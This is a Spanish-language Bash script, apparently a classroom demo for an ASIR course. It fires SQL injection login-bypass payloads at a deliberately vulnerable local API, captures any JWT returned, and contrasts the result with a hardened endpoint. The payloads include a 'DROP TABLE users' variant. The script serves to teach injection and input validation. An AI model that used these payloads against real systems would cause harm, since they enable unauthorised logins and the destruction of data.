#!/bin/bash
# ============================================================
#  SOFIA SOLUTIONS — SQL Injection Bypass Demo (Académico ASIR)
#  Uso: bash sofia-sqli.sh
#  Endpoint vulnerable: POST /api/v1/auth/login
#  Endpoint seguro:     POST /api/v2/auth/login  (validación estricta)
# ============================================================

API_BASE="${API_BASE:-http://localhost:8001}"
URL_VULN="$API_BASE/api/v1/auth/login"
URL_SAFE="$API_BASE/api/v2/auth/login"

# ---- Verificar disponibilidad ----
echo "============================================="
echo "  SOFIA SOLUTIONS — SQL Injection Demo (ASIR)"
echo "============================================="
echo "[*] Verificando conectividad con $API_BASE..."
HTTP_CHECK=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$API_BASE/health" 2>/dev/null)
if [ "$HTTP_CHECK" != "200" ]; then
    echo "[✗] No se puede conectar con la API en $API_BASE"
    echo "    Asegúrate de que el backend está corriendo: docker ps"
    exit 1
fi
echo "[✓] API disponible — HTTP $HTTP_CHECK"
echo ""

PAYLOADS=(
    "' OR 1=1--"
    "' OR '1'='1"
    "admin'--"
    "' OR 1=1; DROP TABLE users;--"
    "\" OR 1=1--"
)

echo "--- FASE 1: Endpoint VULNERABLE (/api/v1/auth/login) ---"
echo ""
for PAYLOAD in "${PAYLOADS[@]}"; do
    echo "[*] Payload: $PAYLOAD"

    RESPONSE=$(curl -s -w "\n%{http_code}" --max-time 5 -X POST "$URL_VULN" \
        -H "Content-Type: application/json" \
        -H "Origin: http://localhost:8000" \
        -d "{\"email\":\"$PAYLOAD\",\"password\":\"cualquiera\"}")

    HTTP_CODE=$(echo "$RESPONSE" | tail -1)
    BODY=$(echo "$RESPONSE" | head -n -1)

    if [ "$HTTP_CODE" = "200" ]; then
        TOKEN=$(echo "$BODY" | grep -oP '"accessToken":"\K[^"]+' 2>/dev/null || echo "")
        VULN_FLAG=$(echo "$BODY" | grep -o '"SQLI_BYPASS"' | wc -l | tr -d ' ')
        if [ "$VULN_FLAG" -gt 0 ] || [ -n "$TOKEN" ]; then
            echo "[!!!] BYPASS EXITOSO — Inyección SQL efectiva"
            [ -n "$TOKEN" ] && echo "[!!!] Token JWT obtenido: ${TOKEN:0:40}..."
        else
            echo "[+] HTTP 200 — Respuesta inesperada"
        fi
    else
        echo "[ ] HTTP $HTTP_CODE — No explotable con este payload"
    fi
    echo ""
    sleep 0.2
done

echo ""
echo "--- FASE 2: Endpoint SEGURO (/api/v2/auth/login) ---"
echo "[*] Probando el mismo primer payload contra el endpoint seguro..."
FIRST_PAYLOAD="${PAYLOADS[0]}"
RESPONSE=$(curl -s -w "\n%{http_code}" --max-time 5 -X POST "$URL_SAFE" \
    -H "Content-Type: application/json" \
    -H "Origin: http://localhost:8000" \
    -d "{\"email\":\"$FIRST_PAYLOAD\",\"password\":\"cualquiera\"}")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
echo "[✓] Resultado con validación estricta: HTTP $HTTP_CODE (esperado: 400 o 422)"
echo ""
echo "============================================="
echo "  FIN — Diferencia entre V1 (vulnerable) y V2 (seguro)"
echo "============================================="
